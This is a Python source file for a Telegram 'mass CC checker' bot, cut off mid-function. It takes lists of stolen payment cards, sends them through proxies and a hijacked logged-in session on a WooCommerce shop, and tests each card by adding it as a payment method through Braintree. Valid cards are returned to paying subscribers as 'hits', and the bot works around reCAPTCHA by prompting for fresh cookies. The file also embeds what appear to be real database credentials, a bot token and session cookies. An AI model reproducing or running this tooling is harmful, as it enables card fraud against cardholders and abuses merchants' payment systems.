import asyncio
import logging
import random
import string
import time
import uuid
from datetime import datetime, timedelta
import base64
import re
import aiohttp
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
import pymongo
from pymongo import MongoClient
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# MongoDB setup
try:
    client = MongoClient("mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0", serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client["fn_checker"]
    users_collection = db["users"]
    keys_collection = db["keys"]
    progress_collection = db["progress"]
    cookies_collection = db["cookies"]
except Exception as e:
    logger.error(f"MongoDB connection failed: {e}")
    raise

# Bot configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs")
OWNER_ID = 7593550190
CHECKING_LIMITS = {"Gold": 500, "Platinum": 1000, "Owner": 3000}
CONCURRENT_REQUESTS = 3
TIMEOUT_SECONDS = 70
COOKIE_REFRESH_INTERVAL = 3600  # 1 hour in seconds
WEBSITE_URL = "https://www.woolroots.com"
WEBSITE_PLACEHOLDER = "[Website]"

# Cookie lock for thread-safe access
COOKIE_LOCK = asyncio.Lock()

# Initialize session cookies from MongoDB or default
def load_cookies():
    cookie_doc = cookies_collection.find_one({"key": "session_cookies"})
    if cookie_doc and "cookies" in cookie_doc:
        return cookie_doc["cookies"]
    return {
        "sbjs_migrations": "1418474375998%3D1",
        "sbjs_current_add": "fd%3D2025-06-04%2009%3A09%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2F%7C%7C%7Crf%3D%28none%29",
        "sbjs_first_add": "fd%3D2025-06-04%2009%3A09%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2F%7C%7C%7Crf%3D%28none%29",
        "sbjs_current": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
        "sbjs_first": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
        "sbjs_udata": "vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36",
        "PHPSESSID": "pv0b1l1avd10nrudlr5ft2e6tb",
        "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221": "electraop%7C1750239642%7CvF1ijGS4QZglze3afPNmFp9UnNpOVXCNwWaNS6aeDrn%7C6de83df07278412bcad730cce87f24a0d498899bfec189b49d068cb2af98020d",
        "sbjs_session": "pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F"
    }

SESSION_COOKIES = load_cookies()

# Load proxies from file
def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Failed to load proxies: {e}")
        return []

PROXIES = load_proxies()

async def save_cookies():
    """Save cookies to MongoDB."""
    async with COOKIE_LOCK:
        cookies_collection.update_one(
            {"key": "session_cookies"},
            {"$set": {"cookies": SESSION_COOKIES, "updated_at": datetime.utcnow()}},
            upsert=True
        )
        logger.info("Cookies saved to MongoDB")

async def test_proxy(proxy: str) -> bool:
    """Test if a proxy is working by attempting a connection."""
    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=aiohttp.ClientTimeout(total=5)
        ) as session:
            async with session.get("https://www.google.com", proxy=proxy) as response:
                return response.status == 200
    except Exception as e:
        logger.error(f"Proxy {proxy} test failed: {e}")
        return False

def mask_proxy(proxy: str) -> str:
    """Mask proxy IP and port for display (e.g., 196.196.xx.xxx:12xxx)."""
    try:
        proxy_parts = proxy.split("@")
        if len(proxy_parts) > 1:
            proxy_addr = proxy_parts[1]
        else:
            proxy_addr = proxy_parts[0].replace("http://", "").replace("https://", "")
        
        ip_port = proxy_addr.split(":")
        ip = ip_port[0]
        port = ip_port[1] if len(ip_port) > 1 else "80"
        
        ip_parts = ip.split(".")
        masked_ip = f"{ip_parts[0]}.{ip_parts[1]}.xx.xxx" if len(ip_parts) == 4 else ip
        masked_port = f"{port[:2]}xxx" if len(port) >= 2 else port
        
        return f"{masked_ip}:{masked_port}"
    except Exception as e:
        logger.error(f"Error masking proxy {proxy}: {e}")
        return "Invalid proxy format"

async def refresh_cookies(context: ContextTypes.DEFAULT_TYPE = None):
    """Attempt to refresh cookies using existing cookies."""
    global SESSION_COOKIES
    async with COOKIE_LOCK:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                    "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                }
                async with session.get(f"{WEBSITE_URL}/my-account/", headers=headers, allow_redirects=True) as response:
                    response_text = await response.text()
                    if "g-recaptcha" in response_text or "I'm not a robot" in response_text or "Log in" in response_text:
                        logger.warning("Cookies expired or invalid during refresh")
                        if context:
                            await context.bot.send_message(
                                chat_id=OWNER_ID,
                                text=f"Cookies expired or invalid. Please log in to {WEBSITE_PLACEHOLDER}/my-account/ manually, copy the cookies (PHPSESSID and wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221), and use /updatecookies to update them."
                            )
                        return False

                    # Extract new cookies from response headers
                    new_cookies = {}
                    for cookie in response.headers.getall("Set-Cookie", []):
                        if "PHPSESSID=" in cookie:
                            value = cookie.split("PHPSESSID=")[1].split(";")[0]
                            new_cookies["PHPSESSID"] = value
                        elif "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=" in cookie:
                            value = cookie.split("wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=")[1].split(";")[0]
                            new_cookies["wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221"] = value

                    if new_cookies:
                        SESSION_COOKIES.update(new_cookies)
                        await save_cookies()
                        logger.info(f"Refreshed cookies: {new_cookies.keys()}")
                        return True
                    else:
                        logger.info("No new cookies received, current cookies still valid")
                        return True
        except Exception as e:
            logger.error(f"Cookie refresh failed: {e}")
            if context:
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"Cookie refresh failed: {e}. Please log in to {WEBSITE_PLACEHOLDER}/my-account/ manually, copy the cookies (PHPSESSID and wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221), and use /updatecookies to update them."
                )
            return False

async def schedule_cookie_refresh(context: ContextTypes.DEFAULT_TYPE):
    """Periodically attempt to refresh cookies."""
    while True:
        await refresh_cookies(context)
        await asyncio.sleep(COOKIE_REFRESH_INTERVAL)

async def update_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Allow owner to manually update cookies."""
    global SESSION_COOKIES
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can update cookies.")
        logger.error("Unauthorized updatecookies attempt")
        return

    args = context.args
    if len(args) != 2:
        await update.message.reply_text(
            f"Usage: /updatecookies <PHPSESSID> <wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221>\n"
            f"Obtain cookies by logging into {WEBSITE_PLACEHOLDER}/my-account/ in a browser and copying the cookie values."
        )
        logger.error("Invalid updatecookies format")
        return

    async with COOKIE_LOCK:
        new_cookies = {
            "PHPSESSID": args[0],
            "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221": args[1]
        }
        SESSION_COOKIES.update(new_cookies)
        await save_cookies()
    await update.message.reply_text("Cookies updated successfully ✅")
    logger.info("Cookies updated manually via /updatecookies")

async def add_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt owner to upload a new proxies.txt file."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can update proxies.")
        logger.error("Unauthorized addproxies attempt")
        return

    context.user_data["awaiting_proxies"] = True
    await update.message.reply_text("Send your proxies.txt file.")
    logger.info("Prompted owner to send proxies.txt file")

async def handle_proxies_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded proxies.txt file and replace existing proxies."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID or not context.user_data.get("awaiting_proxies", False):
        await update.message.reply_text("Please use /addproxies first to upload a proxies.txt file.")
        logger.error("Unauthorized or unexpected proxies file upload")
        return

    if not update.message.document or update.message.document.file_name != "proxies.txt":
        await update.message.reply_text("Please upload a file named 'proxies.txt'.")
        logger.error("Invalid proxies file name")
        return

    await update.message.reply_text("Changing proxies...")
    logger.info("Received proxies.txt, processing...")

    try:
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        proxies = file_content.decode("utf-8").splitlines()
        proxies = [proxy.strip() for proxy in proxies if proxy.strip()]

        with open("proxies.txt", "w") as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")

        global PROXIES
        PROXIES = proxies
        context.user_data["awaiting_proxies"] = False

        await update.message.reply_text("Proxies changed! Now you can use the bot with /chk.")
        logger.info("Proxies updated successfully")
    except Exception as e:
        await update.message.reply_text(f"Failed to update proxies: {e}")
        logger.error(f"Failed to update proxies: {e}")
        context.user_data["awaiting_proxies"] = False

async def get_bin_info(bin_number: str) -> dict:
    """Fetch card information from the BIN lookup API."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status != 200:
                    logger.error(f"BIN API request failed for {bin_number}: Status {response.status}")
                    return {
                        "brand": "Unknown",
                        "level": "Unknown",
                        "type": "Unknown",
                        "bank": "Unknown",
                        "country_name": "Unknown",
                        "country_flag": ""
                    }
                data = await response.json()
                return {
                    "brand": data.get("brand", "Unknown"),
                    "level": data.get("level", "Unknown"),
                    "type": data.get("type", "Unknown"),
                    "bank": data.get("bank", "Unknown"),
                    "country_name": data.get("country_name", "Unknown"),
                    "country_flag": data.get("country_flag", "")
                }
    except Exception as e:
        logger.error(f"BIN API request failed for {bin_number}: {e}")
        return {
            "brand": "Unknown",
            "level": "Unknown",
            "type": "Unknown",
            "bank": "Unknown",
            "country_name": "Unknown",
            "country_flag": ""
        }

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Upload Files", callback_data="upload"), InlineKeyboardButton("Cancel Check", callback_data="cancel")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"""🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!

🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂
📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰:""",
        reply_markup=reply_markup,
    )
    logger.info("200 OK: Start command executed")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == "upload":
        await query.message.reply_text("Send Your Txt File For Checking")
        logger.info("200 OK: Upload button clicked")
    elif query.data == "cancel" or query.data == "stop":
        progress_collection.update_one({"user_id": user_id}, {"$set": {"stopped": True}})
        await query.message.reply_text("Checking Cancelled ❌")
        logger.info("200 OK: Cancel/Stop button clicked")
    elif query.data == "help":
        await query.message.reply_text(
            f"""𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮

/start - Start the bot
/chk <cc> - Check a single CC (format: number|mm|yy|cvv)
/redeem <key> - Redeem a subscription key
/stop - Stop current checking process
/updatecookies <PHPSESSID> <wordpress_logged_in_...> - Update session cookies (owner only)
/addproxies - Update proxies (owner only)
Send a .txt file to check multiple CCs"""
        )
        logger.info("200 OK: Help button clicked")

async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAULT_TYPE) -> dict:
    start_time = time.time()
    try:
        cc = cx.split("|")[0]
        mes = cx.split("|")[1]
        ano = cx.split("|")[2]
        cvv = cx.split("|")[3]
        if "20" in ano:
            ano = ano.split("20")[1]

        bin_number = cc[:6]
        card_details = await get_bin_info(bin_number)

        proxy = random.choice(PROXIES) if PROXIES else None
        proxy_status = "None"
        proxy_is_live = False
        if proxy:
            proxy_is_live = await test_proxy(proxy)
            masked_proxy = mask_proxy(proxy)
            proxy_status = f"{masked_proxy} {'LIVE ✅' if proxy_is_live else 'DEAD ❌'}"

        session = aiohttp.ClientSession() if not proxy or not proxy_is_live else aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False), connector_owner=False, proxy=proxy
        )
        
        try:
            async with COOKIE_LOCK:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                    "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                }
            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as response:
                response_text = await response.text()
                if "g-recaptcha" in response_text or "I'm not a robot" in response_text:
                    logger.warning("reCAPTCHA detected during card check")
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=f"reCAPTCHA detected during card check. Please log in to {WEBSITE_PLACEHOLDER}/my-account/ manually, copy the cookies (PHPSESSID and wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221), and use /updatecookies to update them."
                    )
                    return {"status": "Error", "card": cx, "error": f"reCAPTCHA detected, please update cookies using /updatecookies"}
                nonce_matches = re.findall(r'"client_token_nonce":"(.*?)"', response_text)
                if not nonce_matches:
                    logger.error(f"Could not find client token nonce. Response: {response_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find client token nonce"}
                no = nonce_matches[0]

            async with COOKIE_LOCK:
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": WEBSITE_URL,
                    "Referer": f"{WEBSITE_URL}/my-account/add-payment-method/",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                }
            data = {"action": "wc_braintree_credit_card_get_client_token", "nonce": no}
            async with session.post(f"{WEBSITE_URL}/wp-admin/admin-ajax.php", headers=headers, data=data) as response:
                response_text = await response.text()
                token_matches = re.findall(r'"data":"(.*?)"', response_text)
                if not token_matches:
                    logger.error(f"Could not find token data. Response: {response_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find token data"}
                token = token_matches[0]
                try:
                    decoded_text = base64.b64decode(token).decode("utf-8")
                except Exception as e:
                    logger.error(f"Token decode error: {e}")
                    return {"status": "Error", "card": cx, "error": f"Token decode error: {e}"}
                au_matches = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au_matches:
                    logger.error(f"Could not find authorization fingerprint. Decoded text: {decoded_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find authorization fingerprint"}
                au = au_matches[0]

            headers = {
                "authority": "payments.braintree-api.com",
                "accept": "*/*",
                "authorization": f"Bearer {au}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "referer": "https://assets.braintreegateway.com/",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            }
            json_data = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano, "cvv": cvv}, "options": {"validate": False}}},
                "operationName": "TokenizeCreditCard",
            }
            async with session.post("https://payments.braintree-api.com/graphql", headers=headers, json=json_data) as response:
                try:
                    token = (await response.json())["data"]["tokenizeCreditCard"]["token"]
                except Exception as e:
                    logger.error(f"Braintree response error: {e}")
                    return {"status": "Error", "card": cx, "error": f"Braintree response error: {e}"}

            async with COOKIE_LOCK:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                    "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                }
            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as ges:
                response_text = await ges.text()
                pay_matches = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response_text)
                if not pay_matches:
                    logger.error(f"Could not find payment nonce. Response: {response_text[:500]}")
                    return {"status": "Error", "card": cx, "error": "Could not find payment nonce"}
                pay = pay_matches[0]

            async with COOKIE_LOCK:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": WEBSITE_URL,
                    "Referer": f"{WEBSITE_URL}/my-account/add-payment-method/",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                    "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                }
            data = {
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": "master-card",
                "wc-braintree-credit-card-3d-secure-enabled": "",
                "wc-braintree-credit-card-3d-secure-verified": "",
                "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_device_data": '{"correlation_id":"51ca2c79b2fb716c3dc5253052246e65"}',
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": pay,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            }
            await asyncio.sleep(25)
            async with session.post(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers, data=data) as response:
                soup = BeautifulSoup(await response.text(), "html.parser")
                try:
                    msg = soup.find("i", class_="nm-font nm-font-close").parent.text.strip()
                except:
                    msg = "Status code avs: Gateway Rejected: avs"

            card_info = f"{cc[:6]}xxxxxx{cc[-4:]} | {mes}/{ano} | {cvv}"

            result = {
                "message": msg,
                "issuer": card_details["bank"],
                "country": f"{card_details['country_name']} {card_details['country_flag']}",
                "time_taken": time.time() - start_time,
                "proxy_status": proxy_status,
                "card_info": f"{card_details['brand']} - {card_details['level']} - {card_details['type']}"
            }

            if "Gateway Rejected" in msg:
                if "avs" in msg:
                    status = "Declined ❌"
                elif "risk_threshold" in msg:
                    status = "Declined ❌"
                else:
                    status = "Declined ❌"
            elif "2010: Card Issuer Declined CVV" in msg:
                status = "CCN ✅"
            elif "Payment method successfully added" in msg:
                status = "Approved ✅"
            else:
                status = "Declined ❌"

            return {
                "status": status,
                "card": cx,
                "card_info": card_info,
                "result": result,
                "checked_by": f"<a href='tg://user?id={user_id}'>{user_id}</a>",
                "tier": tier,
            }
        except Exception as e:
            logger.error(f"Error checking CC {cx}: {e}")
            return {"status": "Error", "card": cx, "error": str(e)}
        finally:
            await session.close()
    except Exception as e:
        logger.error(f"Invalid CC format or parsing error: {e}")
        return {"status": "Error", "card": cx, "error": "Invalid CC format or parsing error"}

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user or "expiration" not in user or user["expiration"] < datetime.utcnow():
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        if user and "expiration" not in user:
            logger.error(f"User {user_id} has incomplete document: missing 'expiration' field")
        return

    tier = user["tier"]
    args = context.args
    if len(args) != 1 or not re.match(r"^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$", args[0]):
        await update.message.reply_text("Invalid format. Use: /chk 4242424242424242|02|27|042")
        logger.error("Invalid CC format provided")
        return

    checking_message = await update.message.reply_text("Checking Your Cc Please Wait..")
    result = await check_cc(args[0], user_id, tier, context)

    if result["status"] == "Error":
        await checking_message.delete()
        await update.message.reply_text(f"Error: {result['error']}")
        logger.error(f"Check CC failed: {result['error']}")
        return

    response = (
        f"{result['status']}\n\n"
        f"[💳]𝗖𝗮𝗿𝗱: <code>{result['card']}</code>\n"
        f"[🔒]𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree Auth\n"
        f"[📋]R𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result['result']['message']}\n\n"
        f"[ℹ️]𝗜𝗻𝗳𝗼: {result['result']['card_info']}\n"
        f"[🏦]𝗜𝘀𝘀𝘂𝗲𝗿: {result['result']['issuer']}\n"
        f"[🌍]𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {result['result']['country']}\n\n"
        f"[⏱]𝗧𝗶𝗺𝗲: {result['result']['time_taken']:.2f} seconds\n"
        f"[🌐]𝗣𝗿𝗼𝘅𝘆: {result['result']['proxy_status']}\n"
        f"[👤]𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {result['checked_by']} ({result['tier']})\n"
        f"[🤖]𝗕𝗼𝘁: <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>"
    )
    await checking_message.delete()
    await update.message.reply_text(response, parse_mode="HTML")
    logger.info("200 OK: CC check completed")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user or "expiration" not in user or user["expiration"] < datetime.utcnow():
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        if user and "expiration" not in user:
            logger.error(f"User {user_id} has incomplete document: missing 'expiration' field")
        return

    tier = user["tier"]
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = file_content.decode("utf-8").splitlines()
    cards = [card.strip() for card in cards if re.match(r"^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$", card.strip())]
    
    if not cards:
        await update.message.reply_text("No valid CCs found in the file.")
        logger.error("No valid CCs found in the file")
        return

    if len(cards) > CHECKING_LIMITS[tier]:
        await update.message.reply_text(f"Your tier ({tier}) allows checking up to {CHECKING_LIMITS[tier]} CCs.")
        cards = cards[:CHECKING_LIMITS[tier]]
        logger.info(f"200 OK: Limited to {CHECKING_LIMITS[tier]} CCs for tier {tier}")

    await update.message.reply_text(
        f"""✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝! 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...

⚡ 𝐒𝐩𝐞𝐞𝐝: 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐖𝐡𝐞𝐧 50 𝐜𝐚𝐫𝐝𝐬/𝐬𝐞𝐜"""
    )
    logger.info("200 OK: File received for checking")

    progress_collection.insert_one({
        "user_id": user_id,
        "total": len(cards),
        "approved": 0,
        "declined": 0,
        "ccn": 0,
        "checked": 0,
        "start_time": time.time(),
        "results": [],
        "stopped": False,
        "last_response": "None"
    })

    async def update_progress(progress_message):
        while True:
            progress = progress_collection.find_one({"user_id": user_id})
            if not progress or progress["checked"] >= progress["total"] or progress.get("stopped", False):
                break
            approved = progress["approved"]
            declined = progress["declined"]
            ccn = progress["ccn"]
            checked = progress["checked"]
            total = progress["total"]
            last_response = progress["last_response"]
            
            keyboard = [[
                InlineKeyboardButton(f"Approved ✅: {approved}", callback_data="noop"),
                InlineKeyboardButton(f"CCN✅: {ccn}", callback_data="noop"),
                InlineKeyboardButton(f"Declined ❌: {declined}", callback_data="noop")
            ], [
                InlineKeyboardButton(f"Stop 🔴", callback_data="stop"),
                InlineKeyboardButton(f"Response 💎: {last_response}", callback_data="noop")
            ]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await context.bot.edit_message_text(
                    chat_id=update.message.chat_id,
                    message_id=progress_message.message_id,
                    text=f"Checking Progress...\nTotal: {total}\nChecked: {checked}",
                    reply_markup=reply_markup
                )
            except:
                pass
            await asyncio.sleep(5)

    progress_message = await update.message.reply_text("Starting progress...")
    asyncio.create_task(update_progress(progress_message))

    results = []
    for i in range(0, len(cards), CONCURRENT_REQUESTS):
        progress = progress_collection.find_one({"user_id": user_id})
        if progress.get("stopped", False):
            break
            
        batch = cards[i:i+CONCURRENT_REQUESTS]
        tasks = [check_cc(card, user_id, tier, context) for card in batch]
        batch_results = await asyncio.gather(*tasks)
        results.extend(batch_results)

        progress = progress_collection.find_one({"user_id": user_id})
        for result in batch_results:
            if result["status"] == "Error":
                if "reCAPTCHA detected" in result["error"]:
                    await update.message.reply_text(f"Checking paused due to reCAPTCHA. Please update cookies using /updatecookies.")
                    progress_collection.update_one({"user_id": user_id}, {"$set": {"stopped": True}})
                    return
                continue
            if result["status"] == "Approved ✅":
                progress["approved"] += 1
            elif result["status"] == "CCN ✅":
                progress["ccn"] += 1
            else:
                progress["declined"] += 1
            progress["checked"] += 1
            progress["results"].append(result)
            progress["last_response"] = result["result"]["message"]
            progress_collection.update_one({"user_id": user_id}, {"$set": progress})

        if progress["checked"] % 50 == 0:
            await update.message.reply_text(f"Checked {progress['checked']} cards")
        await asyncio.sleep(TIMEOUT_SECONDS)

    progress = progress_collection.find_one({"user_id": user_id})
    if not progress:
        return
        
    total_time = time.time() - progress["start_time"]
    avg_speed = progress["checked"] / total_time if total_time > 0 else 0
    success_rate = (progress["approved"] + progress["ccn"]) / progress["total"] * 100 if progress["total"] > 0 else 0

    summary = (
        f"""[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {progress['approved']}
[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱: {progress['declined']}
[✪] 𝐂𝐡𝐞𝐜𝐤𝗲𝗱: {progress['checked']}/{progress['total']}
[✪] 𝐓𝐨𝐭𝐚𝐥: {progress['total']}
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝗼𝗻: {total_time:.2f} seconds
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {avg_speed:.2f} cards/sec
[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝐭𝗲: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥✘ </a>"""
    )
    await update.message.reply_text(summary, parse_mode="HTML")
    logger.info("200 OK: File checking completed")

    hits = [r for r in progress["results"] if r["status"] in ["Approved ✅", "CCN ✅"]]
    if hits:
        hits_file = f"fn-b3-hits-{random.randint(1000, 9999)}.txt"
        with open(hits_file, "w") as f:
            for hit in hits:
                f.write(f"{hit['card']} - {hit['status']} - {hit['result']['message']}\n")
        await update.message.reply_document(document=open(hits_file, "rb"), filename=hits_file)
        logger.info("200 OK: Hits file generated and sent")
        os.remove(hits_file)

    progress_collection.delete_one({"user_id": user_id})

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can generate keys.")
        logger.error("Unauthorized genkey attempt")
        return

    args = context.args
    if len(args) != 3 or args[0] not in CHECKING_LIMITS or not args[1].endswith("d") or not args[2].isdigit():
